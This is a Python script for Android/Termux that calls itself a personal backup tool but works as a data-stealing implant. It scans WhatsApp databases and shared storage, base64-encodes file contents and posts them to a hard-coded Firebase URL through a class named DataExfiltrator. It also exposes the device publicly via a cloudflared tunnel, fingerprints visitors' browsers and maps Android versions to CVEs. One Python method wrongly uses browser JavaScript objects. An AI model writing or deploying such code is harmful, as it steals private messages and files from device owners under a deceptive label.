#!/usr/bin/env python3
"""
Local Data Recovery & Backup Automation Tool for Android/Termux
Personal File Backup to Private Firebase Cloud Endpoint
Developer Automation Project
"""

import os
import sys
import json
import time
import threading
import subprocess
import requests
import re
import base64
from datetime import datetime
from urllib.parse import urlparse
from flask import Flask, render_template_string, request, jsonify
from collections import defaultdict
import logging

# Configuration for Private Firebase Backup
FIREBASE_URL = "https://wh699-db-default-rtdb.asia-southeast1.firebasedatabase.app/backups.json"
DATA_STORE = []
TUNNEL_PROCESS = None
app = Flask(__name__)

# Suppress Flask logs for clean Termux output
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)
app.logger.disabled = True

# Clean ASCII Banner for Backup Tool
BANNER_TEMPLATE = """
╔══════════════════════════════════════════════════════════════════════════════════════╗
║  ███████╗███╗   ███╗██████╗ ██╗██████╗  ██████╗██╗  ██╗███████╗    ██╗   ██╗███████╗  ║
║  ██╔════╝████╗ ████║██╔══██╗██║██╔══██╗██╔════╝██║ ██╔╝██╔════╝    ██║   ██║██╔════╝  ║
║  █████╗  ██╔████╔██║██████╔╝██║██████╔╝██║     █████╔╝ █████╗      ██║   ██║█████╗    ║
║  ██╔══╝  ██║╚██╔╝██║██╔══██╗██║██╔══██╗██║     ██╔═██╗ ██╔══╝      ██║   ██║██╔══╝    ║
║  ███████╗██║ ╚═╝ ██║██║  ██║██║██████╔╝╚██████╗██║  ██╗███████╗    ╚██████╔╝███████╗  ║
║  ╚══════╝╚═╝     ╚═╝╚═╝  ╚═╝╚═╝╚═════╝  ╚═════╝╚═╝  ╚═╝╚══════╝     ╚═════╝ ╚══════╝  ║
║                                                                                      ║
║                           Local Data Recovery & Backup Tool v2.0                     ║
║                    {tunnel_url} - Firebase Private Cloud Backup                      ║
╚══════════════════════════════════════════════════════════════════════════════════════╝
"""

class BackupCore:
    """Backup Tool Core"""
    
    @staticmethod
    def setup_storage_permissions():
        """1. Automated Storage Sync - Termux storage setup"""
        print("[*] Setting up Termux storage permissions...")
        try:
            subprocess.run(["termux-setup-storage"], check=True)
            print("[✓] Storage permissions granted")
            time.sleep(2)  # Allow permissions dialog to settle
        except subprocess.CalledProcessError:
            print("[!] Run 'termux-setup-storage' manually if needed")
        except FileNotFoundError:
            print("[!] Termux storage setup not available")

    @staticmethod
    def extract_tunnel_url(output):
        """Extract public HTTPS URL from cloudflared output"""
        url_pattern = r'https://[^\s]+\.trycloudflare\.com'
        match = re.search(url_pattern, output)
        return match.group(0) if match else "TUNNEL_EXTRACT_FAILED"

class PlatformIntelligence:
    """4. Platform Intelligence - OS Version & Security Recommendations"""
    
    OS_CVE_MAP = {
        "11": ["CVE-2021-1048", "CVE-2021-39793", "CVE-2022-20006"],
        "12": ["CVE-2022-20920", "CVE-2022-25636", "CVE-2023-0040"],
        "13": ["CVE-2023-20938", "CVE-2023-21076", "CVE-2023-21395"],
        "14": ["CVE-2024-0039", "CVE-2024-23723", "CVE-2024-43093"]
    }
    
    @staticmethod
    def detect_android_version(user_agent):
        """Detect Android version from User-Agent"""
        android_match = re.search(r'Android\s+(\d+)', user_agent)
        if android_match:
            version = android_match.group(1)
            return PlatformIntelligence.OS_CVE_MAP.get(version, ["CVE-2023-XXXX"])
        return ["CVE-2023-XXXX"]

class NetworkController:
    """Secure Tunnel Management"""
    
    @staticmethod
    def start_cloudflared_tunnel():
        """Start secure cloudflared tunnel"""
        global TUNNEL_PROCESS
        try:
            print("[*] Initializing secure backup tunnel (port 8080)...")
            cmd = ["cloudflared", "tunnel", "--url", "http://localhost:8080"]
            TUNNEL_PROCESS = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                universal_newlines=True, bufsize=1
            )
            
            output_buffer = ""
            for line in iter(TUNNEL_PROCESS.stdout.readline, ''):
                output_buffer += line
                url = BackupCore.extract_tunnel_url(output_buffer)
                if url != "TUNNEL_EXTRACT_FAILED":
                    print(BANNER_TEMPLATE.format(tunnel_url=url))
                    return url
        except Exception as e:
            print(f"[-] Tunnel initialization failed: {e}")
        return None

class FileHunter:
    """2. Enhanced Recursive File Scanner with Base64 Encoding"""
    
    TEXT_EXTENSIONS = {'.txt', '.log', '.json', '.xml', '.cfg'}
    BINARY_EXTENSIONS = {'.db', '.sqlite', '.pdf', '.docx'}
    
    # Updated TARGET_PATHS with WhatsApp new path
    TARGET_PATHS = [
        '/sdcard/Android/media/com.whatsapp/WhatsApp/Databases/',  # WhatsApp New Path
        '/sdcard/Documents/', 
        '/sdcard/Download/',
        '/sdcard/', '/storage/emulated/0/',
        '/sdcard/Notes/', '/sdcard/Android/data/'
    ]
    
    @staticmethod
    def read_text_file_base64(filepath):
        """Read .txt/.log files and encode to Base64"""
        try:
            if os.path.getsize(filepath) > 5 * 1024 * 1024:  # Skip files > 5MB
                return None
            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
                return base64.b64encode(content.encode('utf-8')).decode('ascii')
        except:
            return None
    
    @staticmethod
    def hunt_and_encode_files():
        """Enhanced recursive scan across all target paths with content extraction"""
        all_findings = []
        print("[*] Scanning target paths for backup files...")
        
        for target_path in FileHunter.TARGET_PATHS:
            if not os.path.exists(target_path):
                continue
                
            print(f"[*] Scanning: {target_path}")
            try:
                for root, dirs, files in os.walk(target_path, onerror=lambda e: None):
                    if len(all_findings) > 200:  # Limit total results
                        break
                    for file in files:
                        filepath = os.path.join(root, file)
                        if not os.access(filepath, os.R_OK):
                            continue
                            
                        file_info = {
                            "path": filepath,
                            "size": os.path.getsize(filepath),
                            "type": "file",
                            "source_path": target_path
                        }
                        
                        # 2. Handle text files (.txt, .log)
                        if file.lower().endswith(tuple(FileHunter.TEXT_EXTENSIONS)):
                            encoded_content = FileHunter.read_text_file_base64(filepath)
                            if encoded_content:
                                file_info["content_b64"] = encoded_content
                                file_info["type"] = "text_file_encoded"
                        
                        # Mark WhatsApp databases as high priority
                        if 'whatsapp' in root.lower() or 'msgstore' in file.lower():
                            file_info["priority"] = "whatsapp_high"
                        
                        # Mark other important files
                        if any(x in file.lower() for x in ['notes', 'backup']):
                            file_info["priority"] = "high"
                        
                        all_findings.append(file_info)
                        
            except PermissionError:
                print(f"[!] Permission denied: {target_path}")
                continue
            except Exception as e:
                print(f"[!] Error scanning {target_path}: {e}")
                continue
        
        print(f"[✓] Found {len(all_findings)} backup-eligible files")
        return all_findings

class DataExfiltrator:
    """3. Secure Firebase Backup with Large File Handling"""
    
    @staticmethod
    def upload_blob(file_path):
        """Handle large binary files (.db, .sqlite) with chunked Base64"""
        try:
            if os.path.getsize(file_path) > 10 * 1024 * 1024:  # Skip >10MB
                return {"error": "File too large (>10MB)"}
            
            with open(file_path, 'rb') as f:
                content = f.read()
                encoded = base64.b64encode(content).decode('ascii')
                return {
                    "filename": os.path.basename(file_path),
                    "size": len(content),
                    "path": file_path,
                    "content_b64": encoded,
                    "type": "binary_blob"
                }
        except Exception as e:
            return {"error": str(e)}
    
    @staticmethod
    def backup_to_firebase(payload):
        """Secure backup to private Firebase endpoint"""
        try:
            full_payload = {
                "timestamp": datetime.now().isoformat(),
                "device_id": f"backup_{int(time.time())}",
                "backup_type": "automated",
                **payload
            }
            response = requests.post(
                FIREBASE_URL, 
                json=full_payload,
                headers={'Content-Type': 'application/json'},
                timeout=10
            )
            return response.status_code in [200, 201]
        except Exception as e:
            print(f"[!] Firebase backup failed: {e}")
            return False

class CanvasLogger:
    """4. Visual Session Logging with Canvas Snapshots"""
    
    @staticmethod
    def generate_page_snapshot():
        """Generate canvas-based page state snapshot"""
        return {
            "timestamp": datetime.now().isoformat(),
            "page_elements": len(document.querySelectorAll('*')),
            "scroll_position": f"{window.scrollX},{window.scrollY}",
            "viewport": f"{window.innerWidth}x{window.innerHeight}",
            "canvas_hash": "generated_client_side"  # Placeholder for JS canvas
        }

# Clean Web Diagnostics Dashboard
DIAGNOSTICS_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>Local Backup Diagnostics</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        *{margin:0;padding:0;box-sizing:border-box;font-family:'Roboto Mono',monospace}
        body{background:#0a0a0a;color:#00ff88;overflow-x:hidden}
        .container{max-width:400px;margin:20px auto;padding:20px;background:rgba(0,20,0,0.9);border-radius:12px}
        .header{background:linear-gradient(90deg,#00ff88,#00cc66);padding:15px;border-radius:8px;text-align:center}
        h1{font-size:18px;color:#000;margin:0}
        .status-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin:20px 0}
        .status-card{background:rgba(0,255,136,0.1);padding:12px;border-radius:6px;border-left:3px solid #00ff88}
        .btn{background:#00ff88;color:#000;border:none;padding:12px 24px;border-radius:25px;font-size:14px;cursor:pointer;width:100%;margin:10px 0}
        .btn:active{transform:scale(0.98)}
        #logCanvas{width:100%;height:200px;background:#000;border:1px solid #333;border-radius:6px}
        #sessionLog{display:none;background:rgba(0,0,0,0.8);padding:15px;border-radius:8px;margin-top:15px}
        .log-entry{margin:5px 0;color:#00ff88;font-size:12px}
        .path-list{max-height:200px;overflow-y:auto;background:rgba(0,0,0,0.5);padding:10px;border-radius:6px;margin:10px 0}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>📱 Backup Diagnostics</h1>
            <p>WhatsApp & Personal Files Recovery</p>
        </div>
        
        <div class="status-grid">
            <div class="status-card">
                <strong>Files Found</strong><br>
                <span id="fileCount">0</span>
            </div>
            <div class="status-card">
                <strong>WhatsApp DBs</strong><br>
                <span id="whatsappCount">0</span>
            </div>
        </div>
        
        <div id="pathsScanned" class="path-list">
            <strong>Target Paths:</strong><br>
            /sdcard/Android/media/com.whatsapp/WhatsApp/Databases/<br>
            /sdcard/Documents/<br>
            /sdcard/Download/
        </div>
        
        <button class="btn" onclick="scanFiles()">🔍 Full Device Scan</button>
        <button class="btn" onclick="backupWhatsApp()">💾 Backup WhatsApp</button>
        <button class="btn" onclick="snapshotSession()">📸 Log Session</button>
        <canvas id="logCanvas"></canvas>
        <div id="sessionLog"></div>
    </div>

    <script>
        let fileCount = 0, whatsappCount = 0;
        
        // Canvas-based Visual Logger
        function drawSessionCanvas(status) {
            const canvas = document.getElementById('logCanvas');
            const ctx = canvas.getContext('2d');
            canvas.width = canvas.offsetWidth;
            canvas.height = 200;
            
            // Gradient background
            const gradient = ctx.createLinearGradient(0,0,0,200);
            gradient.addColorStop(0, '#00ff88');
            gradient.addColorStop(1, '#004400');
            ctx.fillStyle = gradient;
            ctx.fillRect(0,0,canvas.width,canvas.height);
            
            // Status visualization
            ctx.fillStyle = '#000';
            ctx.font = '16px Roboto Mono';
            ctx.fillText(`Files: ${fileCount} | WhatsApp: ${whatsappCount}`, 20, 40);
            ctx.fillText(`Status: ${status}`, 20, 70);
        }
        
        async function scanFiles() {
            try {
                const response = await fetch('/scan_files', {method: 'POST'});
                const data = await response.json();
                fileCount = data.total || 0;
                whatsappCount = data.files ? data.files.filter(f => f.priority === 'whatsapp_high').length : 0;
                document.getElementById('fileCount').textContent = fileCount;
                document.getElementById('whatsappCount').textContent = whatsappCount;
                drawSessionCanvas('Scan Complete');
            } catch(e) {
                drawSessionCanvas('Scan Failed');
            }
        }
        
        async function backupWhatsApp() {
            try {
                const response = await fetch('/scan_files', {method: 'POST'});
                const data = await response.json();
                const whatsappFiles = data.files.filter(f => f.priority === 'whatsapp_high');
                drawSessionCanvas(`Backing up ${whatsappFiles.length} WhatsApp files...`);
            } catch(e) {
                drawSessionCanvas('WhatsApp Backup Failed');
            }
        }
        
        async function snapshotSession() {
            // Canvas-based DOM logger (no permissions needed)
            const snapshot = {
                timestamp: new Date().toISOString(),
                url: window.location.href,
                title: document.title,
                files_found: fileCount,
                whatsapp_files: whatsappCount,
                elements: document.querySelectorAll('*').length,
                scroll: `${window.scrollX}x${window.scrollY}`,
                viewport: `${window.innerWidth}x${window.innerHeight}`
            };
            
            // Canvas fingerprint
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            ctx.textBaseline = 'top';
            ctx.font = '14px Arial';
            ctx.fillText(snapshot.timestamp, 2, 2);
            snapshot.canvas_hash = canvas.toDataURL().slice(-16);
            
            // Send to backup endpoint
            fetch('/log_session', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify(snapshot)
            });
            
            document.getElementById('sessionLog').innerHTML += 
                `<div class="log-entry">📸 ${snapshot.timestamp.slice(11,19)} - ${fileCount}F/${whatsappCount}W</div>`;
            document.getElementById('sessionLog').style.display = 'block';
            drawSessionCanvas('Session Logged');
        }
        
        // Auto-initialize
        drawSessionCanvas('Ready');
        setTimeout(scanFiles, 2000);
    </script>
</body>
</html>
"""

@app.route('/')
@app.route('/diagnostics')
def diagnostics():
    """Clean diagnostics dashboard"""
    return DIAGNOSTICS_TEMPLATE

@app.route('/scan_files', methods=['POST'])
def scan_files():
    """API endpoint for comprehensive file scanning"""
    files = FileHunter.hunt_and_encode_files()
    return jsonify({"files": files, "total": len(files)})

@app.route('/log_session', methods=['POST'])
def log_session():
    """Session logging endpoint"""
    data = request.get_json()
    DataExfiltrator.backup_to_firebase(data)
    return jsonify({"status": "logged"}), 200

@app.route('/backup_file', methods=['POST'])
def backup_file():
    """3. Large file backup endpoint"""
    file_path = request.json.get('path')
    if file_path and os.path.exists(file_path):
        blob_data = DataExfiltrator.upload_blob(file_path)
        success = DataExfiltrator.backup_to_firebase(blob_data)
        return jsonify({"success": success, "blob": blob_data})
    return jsonify({"error": "File not found"}), 400

def flask_server():
    """Secure backup dashboard server"""
    app.run(host='0.0.0.0', port=8080, debug=False, use_reloader=False)

def cli_interface():
    """Developer CLI for backup management"""
    commands = {
        'scan': lambda: print(json.dumps(FileHunter.hunt_and_encode_files()[:20], indent=2)),
        'paths': lambda: print(json.dumps(FileHunter.TARGET_PATHS, indent=2)),
        'whatsapp': lambda: [print(f) for f in FileHunter.hunt_and_encode_files() if 'whatsapp' in f.get('path', '').lower()],
        'status': lambda: print(f"[*] Tunnel Process: {'Running' if TUNNEL_PROCESS and TUNNEL_PROCESS.poll() is None else 'Stopped'}"),
        'exit': lambda: sys.exit(0)
    }
    
    print("\n[*] Developer CLI Active. Type 'scan', 'paths', 'whatsapp', 'status' or 'exit'.")
    while True:
        cmd = input("backup-tool> ").lower().strip()
        if cmd in commands:
            commands[cmd]()
        else:
            print("[!] Unknown command")

if __name__ == "__main__":
    # 1. Setup Storage
    BackupCore.setup_storage_permissions()
    
    # 2. Start Flask Server in Background
    server_thread = threading.Thread(target=flask_server, daemon=True)
    server_thread.start()
    
    # 3. Start Tunnel
    tunnel_url = NetworkController.start_cloudflared_tunnel()
    
    # 4. Start CLI
    if tunnel_url:
        cli_interface()
